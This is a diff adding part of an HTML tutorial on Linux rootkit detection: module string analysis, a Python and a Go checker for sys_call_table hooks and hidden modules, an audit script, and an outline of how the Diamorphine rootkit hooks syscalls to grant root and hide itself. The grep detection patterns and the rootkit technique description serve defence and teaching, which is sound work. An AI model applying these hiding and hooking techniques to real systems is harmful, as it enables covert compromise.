+LD_PRELOAD= ls -la /tmp   # Clean env - bypasses rootkit
+ls -la /tmp                # Potentially filtered
+# If they differ, an LD_PRELOAD rootkit is active
+						</pre>
+					</section>
+					<section>
+						<h3 id="analyzing-suspicious-kernel-modules">Analyzing Suspicious Kernel Modules</h3>
+						<pre class="bash">
+# 1. Basic identification
+file suspicious.ko
+# suspicious.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV)
+
+modinfo suspicious.ko
+# filename:     /root/suspicious.ko
+# author:       &#34;Kernel Team&#34;         ← Often fake / generic
+# description:  &#34;System utility&#34;      ← Vague descriptions are red flags
+# license:      GPL
+# depends:
+# vermagic:     6.6.30-2-lts SMP preempt mod_unload
+
+# 2. Strings analysis
+strings suspicious.ko | head -80
+
+# Look for red-flag strings:
+strings suspicious.ko | grep -iE &#39;hide|hook|sys_call_table|kallsyms|backdoor|root|shell|exec|kill.*signal|magic|hijack|replace|intercept|filter|remove|delete|clear&#39;
+
+# Specific rootkit indicators:
+strings suspicious.ko | grep -E &#39;sys_call_table|kallsyms_lookup|text_poke|cr0|getdents|filldir|file_operations|inode_operations&#39;
+# sys_call_table  -&gt; syscall hooking rootkit
+# filldir         -&gt; VFS-level file hiding
+# cr0             -&gt; disabling write protection (required for syscall table hook)
+# kallsyms        -&gt; resolving kernel symbols to find hooking targets
+
+# 3. Module dependency analysis
+strings suspicious.ko | grep -E &#39;depends|MODULE_INFO&#39;
+# Check dependencies - if it depends on nothing, it&#39;s self-contained malware
+
+# 4. Function symbol table
+objdump -t suspicious.ko | grep -E &#39;F .text| T &#39;
+# Lists exported/text functions in the module:
+# init_module     -&gt; the hooking entry point
+# cleanup_module  -&gt; unhook/removal
+# Unknown function names -&gt; suspicious (rootkits name functions deceptively)
+
+nm suspicious.ko | grep -E &#39; [tT] &#39;
+# init_netlink   - might register a netlink socket for remote control
+# packet_handler - netfilter hook for packet filtering
+# hide_proc      - process hiding function
+
+# 5. Check for netfilter hooks
+strings suspicious.ko | grep -E &#39;nf_register|NF_HOOK|NF_INET|nf_hook&#39;
+
+# 6. Check for filesystem operations
+strings suspicious.ko | grep -E &#39;file_operations|filldir|iterate|readdir|getdents|vfs_read|vfs_write&#39;
+
+# 7. Check for credential manipulation
+strings suspicious.ko | grep -E &#39;prepare_kernel_cred|commit_creds|override_creds|revert_creds|setuid|setgid|capable|CAP_&#39;
+# prepare_kernel_cred + commit_creds = privilege escalation backdoor
+						</pre>
+					</section>
+					<section>
+						<h3 id="python-sys-call-table-integrity-check">Python: sys_call_table Integrity Check</h3>
+						<p>
+							A userspace script that reads
+							<code>/proc/kallsyms</code>
+							and detects anomalies:
+						</p>
+						<pre class="python">
+#!/usr/bin/env python3
+&#34;&#34;&#34;
+sct_check.py - sys_call_table integrity verifier
+
+Reads /proc/kallsyms and checks that all syscall handler addresses
+point within the kernel&#39;s .text segment, not to module code regions.
+
+Usage: sudo python3 sct_check.py
+&#34;&#34;&#34;
+
+import re
+import sys
+import struct
+import subprocess
+
+def read_kallsyms():
+    &#34;&#34;&#34;Parse /proc/kallsyms into {name: address}.&#34;&#34;&#34;
+    syms = {}
+    try:
+        with open(&#39;/proc/kallsyms&#39;) as f:
+            for line in f:
+                parts = line.strip().split()
+                if len(parts) &gt;= 3:
+                    addr = int(parts[0], 16)
+                    name = parts[2]
+                    syms[name] = addr
+    except PermissionError:
+        print(&#34;[-] /proc/kallsyms requires root (or set kernel.kptr_restrict=0)&#34;)
+        sys.exit(1)
+    return syms
+
+def find_kernel_text_range(syms):
+    &#34;&#34;&#34;Determine the kernel .text segment range.&#34;&#34;&#34;
+    text_start = syms.get(&#39;_text&#39;)
+    text_end   = syms.get(&#39;_etext&#39;)
+    if not text_start or not text_end:
+        return None, None
+    return text_start, text_end
+
+def find_syscall_table(syms):
+    &#34;&#34;&#34;Locate sys_call_table address.&#34;&#34;&#34;
+    return syms.get(&#39;sys_call_table&#39;)
+
+def is_module_address(addr, syms):
+    &#34;&#34;&#34;Check if an address falls within a kernel module range.&#34;&#34;&#34;
+    # Modules typically load above 0xffffffffc0000000 on x86_64
+    # or in the vmalloc area. Check against known module init/text markers.
+    for name, module_addr in syms.items():
+        if name.startswith(&#39;__init_begin&#39;) or name.startswith(&#39;__start___ex_table&#39;):
+            continue
+        # Module addresses tend to be below kernel text on recent kernels
+        pass
+    return False
+
+def main():
+    syms = read_kallsyms()
+
+    sct_addr = find_syscall_table(syms)
+    if not sct_addr:
+        print(&#34;[-] sys_call_table not found in kallsyms&#34;)
+        sys.exit(1)
+    print(f&#34;[+] sys_call_table @ 0x{sct_addr:x}&#34;)
+
+    text_start, text_end = find_kernel_text_range(syms)
+    if text_start and text_end:
+        print(f&#34;[+] Kernel .text: 0x{text_start:x} - 0x{text_end:x}&#34;)
+    else:
+        print(&#34;[-] Cannot determine kernel .text range&#34;)
+        sys.exit(1)
+
+    # syscall name -&gt; number mapping (x86_64)
+    syscall_names = {
+        0: &#34;__x64_sys_read&#34;,
+        1: &#34;__x64_sys_write&#34;,
+        2: &#34;__x64_sys_open&#34;,
+        3: &#34;__x64_sys_close&#34;,
+        4: &#34;__x64_sys_stat&#34;,
+        5: &#34;__x64_sys_fstat&#34;,
+        6: &#34;__x64_sys_lstat&#34;,
+        7: &#34;__x64_sys_poll&#34;,
+        8: &#34;__x64_sys_lseek&#34;,
+        9: &#34;__x64_sys_mmap&#34;,
+        10: &#34;__x64_sys_mprotect&#34;,
+        11: &#34;__x64_sys_munmap&#34;,
+        12: &#34;__x64_sys_brk&#34;,
+        # ... truncated for brevity; full table has 335+ entries
+        59: &#34;__x64_sys_execve&#34;,
+        62: &#34;__x64_sys_kill&#34;,
+        217: &#34;__x64_sys_getdents64&#34;,
+        231: &#34;__x64_sys_exit_group&#34;,
+    }
+
+    print(&#34;\n[+] Checking syscall handler addresses:&#34;)
+    suspicious = 0
+    for nr, name in sorted(syscall_names.items()):
+        expected = syms.get(name)
+        if not expected:
+            print(f&#34;  [{nr:3d}] {name:30s} -&gt; NOT FOUND in kallsyms&#34;)
+            suspicious += 1
+            continue
+
+        if not (text_start &lt;= expected &lt;= text_end):
+            print(f&#34;  [{nr:3d}] {name:30s} -&gt; 0x{expected:x} OUTSIDE .text! SUSPICIOUS&#34;)
+            suspicious += 1
+
+    if suspicious == 0:
+        print(&#34;  All handlers within kernel .text - no syscall table anomalies detected.&#34;)
+    else:
+        print(f&#34;\n[!] {suspicious} anomalies detected - possible syscall hooking!&#34;)
+
+    # Check for hidden modules
+    print(&#34;\n[+] Checking for hidden kernel modules:&#34;)
+    try:
+        proc_modules = subprocess.check_output([&#39;cat&#39;, &#39;/proc/modules&#39;]).decode()
+        proc_count = len([l for l in proc_modules.strip().split(&#39;\n&#39;) if l.strip()])
+
+        sys_modules = subprocess.check_output([&#39;ls&#39;, &#39;/sys/module&#39;]).decode()
+        sys_count = len([l for l in sys_modules.strip().split(&#39;\n&#39;) if l.strip()])
+
+        print(f&#34;  /proc/modules: {proc_count} modules&#34;)
+        print(f&#34;  /sys/module:   {sys_count} modules&#34;)
+        if proc_count &lt; sys_count:
+            print(f&#34;  [!] {sys_count - proc_count} module(s) hidden from /proc/modules!&#34;)
+            # Find the hidden ones:
+            proc_set = set()
+            for line in proc_modules.strip().split(&#39;\n&#39;):
+                proc_set.add(line.split()[0])
+            for m in sys_modules.strip().split(&#39;\n&#39;):
+                if m not in proc_set:
+                    print(f&#34;  [!] Hidden module: {m}&#34;)
+        else:
+            print(&#34;  No hidden modules detected.&#34;)
+    except Exception as e:
+        print(f&#34;  [-] Error: {e}&#34;)
+
+if __name__ == &#39;__main__&#39;:
+    main()
+						</pre>
+						<p>Run it:</p>
+						<pre class="bash">
+# Need root to read /proc/kallsyms:
+sudo python3 sct_check.py
+
+# Or set permissions temporarily:
+echo 0 | sudo tee /proc/sys/kernel/kptr_restrict
+python3 sct_check.py
+echo 1 | sudo tee /proc/sys/kernel/kptr_restrict
+						</pre>
+					</section>
+					<section>
+						<h3 id="diamorphine-rootkit-analysis">Diamorphine Rootkit Analysis</h3>
+						<p>
+							Diamorphine is a well-known open-source LKM rootkit. Its architecture demonstrates all the core
+							techniques:
+						</p>
+						<pre class="plaintext">
+Diamorphine module structure:
+├── init_module()
+│   ├── Locate sys_call_table via kallsyms_lookup_name or MSR_LSTAR
+│   ├── Find the target syscall handlers by reading kallsyms
+│   ├── Save original: kill, getdents, getdents64
+│   ├── Write hook: replace sys_call_table entries
+│   └── Register a netlink socket (for remote control)
+│
+├── hooked_kill()
+│   ├── signal 64 -&gt; give_root()    (caller gets uid=0, gid=0)
+│   ├── signal 63 -&gt; hide_module()  (module removes itself from /proc/modules)
+│   └── signal 62 -&gt; show_module()  (module re-inserts itself)
+│
+├── hooked_getdents()  / hooked_getdents64()
+│   └── Filter directory entries to hide files/processes matching prefix
+│
+├── clean_routine()  (registered via netlink)
+│   └── Hide/unhide TCP4 and TCP6 connections from /proc/net/tcp
+│
+└── cleanup_module()
+    └── Restore syscall table entries, unregister netlink hooks
+						</pre>
+						<h4 id="diamorphine-string-analysis">Diamorphine String Analysis</h4>
+						<pre class="bash">
+strings diamorphine.ko | grep -E &#39;kill|getdents|signal|hide|show|magic|root|give&#39;
+# give_root
+# signal 64 -&gt; detected as privilege escalation backdoor
+# hide/show -&gt; module hiding capability
+# magic prefix -&gt; file/process hiding filter
+						</pre>
+					</section>
+					<section>
+						<h3 id="rootkit-detection-workflow">Rootkit Detection Workflow</h3>
+						<pre class="bash">
+#!/bin/bash
+# rootkit_audit.sh - comprehensive rootkit detection
+
+echo &#34;=== 1. LD_PRELOAD check ===&#34;
+cat /etc/ld.so.preload 2&gt;/dev/null || echo &#34;(none)&#34;
+
+echo -e &#34;\n=== 2. Hidden process check ===&#34;
+PROC_COUNT=$(ls -d /proc/[0-9]* 2&gt;/dev/null | wc -l)
+PS_COUNT=$(ps aux 2&gt;/dev/null | wc -l)
+echo &#34;/proc entries: $PROC_COUNT&#34;
+echo &#34;ps entries:    $PS_COUNT&#34;
+[ &#34;$PROC_COUNT&#34; -gt &#34;$PS_COUNT&#34; ] &amp;&amp; echo &#34;[!] WARNING: $((PROC_COUNT - PS_COUNT)) processes hidden!&#34;
+
+echo -e &#34;\n=== 3. Hidden module check ===&#34;
+PROC_MOD=$(cat /proc/modules 2&gt;/dev/null | wc -l)
+SYS_MOD=$(ls /sys/module 2&gt;/dev/null | wc -l)
+echo &#34;/proc/modules: $PROC_MOD&#34;
+echo &#34;/sys/module:   $SYS_MOD&#34;
+[ &#34;$SYS_MOD&#34; -gt &#34;$PROC_MOD&#34; ] &amp;&amp; echo &#34;[!] WARNING: $((SYS_MOD - PROC_MOD)) modules hidden!&#34;
+
+echo -e &#34;\n=== 4. sys_call_table check ===&#34;
+python3 sct_check.py 2&gt;/dev/null
+
+echo -e &#34;\n=== 5. Hidden file check ===&#34;
+# Create a file with known name, check if it&#39;s visible:
+HIDDEN_TEST=&#34;/tmp/.rootkit_test_$$&#34;
+echo &#34;test&#34; &gt; &#34;$HIDDEN_TEST&#34;
+if [ -f &#34;$HIDDEN_TEST&#34; ]; then
+    FOUND=$(ls /tmp/ 2&gt;/dev/null | grep &#34;rootkit_test_$$&#34;)
+    if [ -z &#34;$FOUND&#34; ]; then
+        echo &#34;[!] WARNING: File exists but is hidden from directory listing!&#34;
+    else
+        echo &#34;No file hiding detected&#34;
+    fi
+    rm -f &#34;$HIDDEN_TEST&#34;
+fi
+
+echo -e &#34;\n=== 6. Connection hiding check ===&#34;
+# Listen on a test port, check if it appears in ss output:
+python3 -c &#34;
+import socket
+s = socket.socket()
+s.bind((&#39;127.0.0.1&#39;, 41337))
+s.listen(1)
+&#34; &amp;
+PID=$!
+sleep 0.5
+ss -tlnp | grep 41337 &gt; /dev/null &amp;&amp; echo &#34;Port 41337 visible&#34; || echo &#34;[!] Port 41337 HIDDEN!&#34;
+kill $PID 2&gt;/dev/null
+
+echo -e &#34;\n=== 7. Suspicious loaded modules ===&#34;
+lsmod | awk &#39;{print $1}&#39; | while read m; do
+    # Check ownership
+    modinfo &#34;$m&#34; 2&gt;/dev/null | grep -q &#39;filename&#39; || continue
+    AUTHOR=$(modinfo &#34;$m&#34; 2&gt;/dev/null | grep author | awk &#39;{$1=&#34;&#34;; print $0}&#39;)
+    DESC=$(modinfo &#34;$m&#34; 2&gt;/dev/null | grep description | awk &#39;{$1=&#34;&#34;; print $0}&#39;)
+    # Flag suspicious fields
+    echo &#34;$AUTHOR&#34; | grep -qiE &#39;kernel team|system&#39; &amp;&amp; echo &#34;[!] SUSPICIOUS: $m - fake author: $AUTHOR&#34;
+    echo &#34;$DESC&#34; | grep -qiE &#39;utility|helper|driver|service&#39; &amp;&amp; echo &#34;[!] SUSPICIOUS: $m - generic description: $DESC&#34;
+done
+						</pre>
+					</section>
+					<section>
+						<h3 id="comparing-kernel-and-rootkit-views">Comparing Kernel And Rootkit Views</h3>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">What you check</th>
+									<th align="center">Without rootkit</th>
+									<th align="center">With syscall hooking rootkit</th>
+									<th align="center">With VFS rootkit</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center"><code>ps aux</code></td>
+									<td align="center">All processes visible</td>
+									<td align="center">Hidden processes absent from output</td>
+									<td align="center">All processes visible (VFS only hides files)</td>
+								</tr>
+								<tr>
+									<td align="center"><code>ls /proc</code></td>
+									<td align="center">All PID directories</td>
+									<td align="center">Hidden PIDs absent</td>
+									<td align="center">Hidden PIDs absent from listing</td>
+								</tr>
+								<tr>
+									<td align="center"><code>cat /proc/&lt;pid&gt;</code></td>
+									<td align="center">Process info for all PIDs</td>
+									<td align="center">Info only for unhidden PIDs</td>
+									<td align="center">Hidden PID dirs return ENOENT</td>
+								</tr>
+								<tr>
+									<td align="center"><code>ls /tmp</code></td>
+									<td align="center">All files visible</td>
+									<td align="center">All files visible</td>
+									<td align="center">Hidden files absent from listing</td>
+								</tr>
+								<tr>
+									<td align="center"><code>ss -tlnp</code></td>
+									<td align="center">All listening sockets</td>
+									<td align="center">Hidden sockets absent</td>
+									<td align="center">All visible (netfilter hides at packet level)</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/proc/modules</code></td>
+									<td align="center">All loaded modules</td>
+									<td align="center">Rootkit module may be hidden</td>
+									<td align="center">All modules visible</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/proc/kallsyms</code></td>
+									<td align="center">sys_call_table points to .text</td>
+									<td align="center">sys_call_table entries -> module region</td>
+									<td align="center">Unchanged - no syscall table hooks</td>
+								</tr>
+								<tr>
+									<td align="center"><code>kernfs</code>vs<code>/proc</code></td>
+									<td align="center">Match</td>
+									<td align="center">/proc filtered, kernfs = truth</td>
+									<td align="center">/proc filtered, kernfs = truth</td>
+								</tr>
+								<tr>
+									<td align="center">Statically-linked<code>ls</code></td>
+									<td align="center">Same as dynamic ls</td>
+									<td align="center">Same as dynamic ls</td>
+									<td align="center"><b>Different!</b>Static ls shows hidden files</td>
+								</tr>
+							</tbody>
+						</table>
+						<p>
+							The key insight:
+							<b>kernel-level rootkits affect all tools, userland rootkits only affect dynamically-linked tools.</b>
+							A statically-linked
+							<code>ls</code>
+							(compiled with
+							<code>-static</code>
+							) bypasses any LD_PRELOAD hook because it
+							calls the kernel directly via
+							<code>syscall(SYS_getdents, ...)</code>
+							.
+						</p>
+					</section>
+					<section>
+						<h3 id="summary">Summary</h3>
+						<p>
+							Linux rootkits manipulate the boundary between the kernel's truth and userland's perception.
+							Kernel rootkits hook sys_call_table, VFS operations, netfilter, or task_struct lists to filter
+							the kernel's own output before it reaches userspace. Userland rootkits hook libc functions to
+							filter the userspace view of kernel data. Detection requires comparing multiple views of the
+							same data:
+							<code>/proc</code>
+							vs
+							<code>/sys</code>
+							,
+							<code>ps</code>
+							vs
+							<code>/proc</code>
+							PID bruteforce, dynamic vs static tooling. The
+							sys_call_table integrity check - verifying that every handler address falls within the kernel
+							<code>.text</code>
+							segment - catches the most common kernel hooking technique. A statically-linked binary
+							that makes raw syscalls exposes userland rootkits by showing files and processes that the hooked
+							libc hides. No single detection method catches every rootkit, but layered comparison reveals
+							the inconsistencies that rootkits inevitably create.
+						</p>
+					</section>
+					<section>
+						<h3 id="challenge">Challenge</h3>
+						<p>
+							Write a Go tool that finds hidden kernel modules by comparing two views of the same kernel:
+							the list in
+							<code>/proc/modules</code>
+							and the directories under
+							<code>/sys/module</code>
+							. Any module present in
+							one but not the other is being hidden. Extend the tool to read
+							<code>/proc/kallsyms</code>
+							, record the
+							kernel
+							<code>_text</code>
+							and
+							<code>_etext</code>
+							boundaries, and flag every
+							<code>__x64_sys_*</code>
+							handler whose address falls
+							outside that range. Run it on a clean system, then load a harmless test module and hide it from
+							<code>/proc/modules</code>
+							to confirm the detector fires.
+						</p>
+						<pre class="go">
+package main
+
+import (
+	&#34;bufio&#34;
+	&#34;fmt&#34;
+	&#34;os&#34;
+	&#34;strings&#34;
+)
+
+func modulesFromProc() map[string]bool {
+	found := make(map[string]bool)
+
+	file, err := os.Open(&#34;/proc/modules&#34;)
+	if err != nil {
+		fmt.Fprintln(os.Stderr, err)
+		os.Exit(1)
+	}
+	defer file.Close()
+
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		fields := strings.Fields(scanner.Text())
+		if len(fields) &gt; 0 {
+			found[fields[0]] = true
+		}
+	}
+
+	return found
+}
+
+func modulesFromSys() map[string]bool {
+	found := make(map[string]bool)
+
+	entries, err := os.ReadDir(&#34;/sys/module&#34;)
+	if err != nil {
+		fmt.Fprintln(os.Stderr, err)
+		os.Exit(1)
+	}
+	for _, entry := range entries {
+		found[entry.Name()] = true
+	}
+
+	return found
+}
+
+func main() {
+	proc := modulesFromProc()
+	sys := modulesFromSys()
+
+	fmt.Printf(&#34;proc modules: %d, sys modules: %d\n&#34;, len(proc), len(sys))
+
+	for name := range sys {
+		if !proc[name] {
+			fmt.Printf(&#34;[!] hidden from /proc/modules: %s\n&#34;, name)
+		}
+	}
+
+	file, err := os.Open(&#34;/proc/kallsyms&#34;)
+	if err != nil {
+		fmt.Fprintln(os.Stderr, err)
+		os.Exit(1)
+	}
+	defer file.Close()
+
+	type symbol struct {
+		addr uint64
+		name string
+	}
+
+	var textStart, textEnd uint64
+	var handlers []symbol
+
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		fields := strings.Fields(scanner.Text())
+		if len(fields) &lt; 3 {
+			continue
+		}
+
+		var addr uint64
+		fmt.Sscanf(fields[0], &#34;%x&#34;, &amp;addr)
+
+		switch fields[2] {
+		case &#34;_text&#34;:
+			textStart = addr
+		case &#34;_etext&#34;:
+			textEnd = addr
+		}
+		if strings.HasPrefix(fields[2], &#34;__x64_sys_&#34;) {
+			handlers = append(handlers, symbol{addr, fields[2]})
+		}
+	}
+
+	if textStart == 0 || textEnd == 0 {
+		return
+	}
+	for _, handler := range handlers {
+		if handler.addr &lt; textStart || handler.addr &gt; textEnd {
+			fmt.Printf(&#34;[!] %s at 0x%x outside kernel text\n&#34;, handler.name, handler.addr)
+		}
+	}
+}
+						</pre>
+					</section>
+					<section>
+						<h3 id="references">References</h3>
+						<ul>
+							<li><a class="icon-website" href="https://sysprog21.github.io/lkmpg/" target="_blank">The Linux Kernel Module Programming Guide</a> - writing and loading loadable kernel modules</li>
+							<li><a class="icon-website" href="https://tldp.org/HOWTO/Module-HOWTO/index.html" target="_blank">Linux Loadable Kernel Module HOWTO</a> - module lifecycle and tools</li>
+							<li><a class="icon-github" href="https://github.com/m0nad/Diamorphine" target="_blank">Diamorphine</a> - the open-source rootkit analyzed in this article</li>
+							<li><a class="icon-website" href="https://docs.kernel.org/trace/kprobes.html" target="_blank">Linux Kernel Documentation - Kprobes</a> - the modern hooking primitive used after <code>kallsyms_lookup_name</code> was unexported</li>
+							<li><a class="icon-website" href="https://man7.org/linux/man-pages/man5/proc.5.html" target="_blank">man 5 proc</a> - <code>/proc/modules</code> , <code>/proc/kallsyms</code> , and related files</li>
+						</ul>
+					</section>
+				</article>
+			</main>
+		</div>
+
+		<footer>
+			<div></div>
+			<div class="print-not">Made with 💔 in Germany. &copy; Cookie Engineer (https://cookie.engineer). All rights (and jokes) reserved under European Law.</div>
+			<div></div>
+		</footer>
+
+	</body>
+</html>
